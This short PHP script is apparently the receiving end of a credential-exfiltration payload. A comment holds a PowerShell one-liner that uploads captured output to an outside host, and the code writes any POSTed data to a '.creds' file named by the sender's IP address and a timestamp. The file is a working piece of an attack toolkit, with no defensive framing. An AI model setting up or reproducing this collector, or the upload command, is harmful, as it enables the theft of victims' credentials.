<?php

/* 
 * 
 * powershell "IEX (New-Object Net.WebClient).UploadString('http://darren.kitchen/rx.php', $output)"
 */

$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
file_put_contents($file, file_get_contents("php://input"));

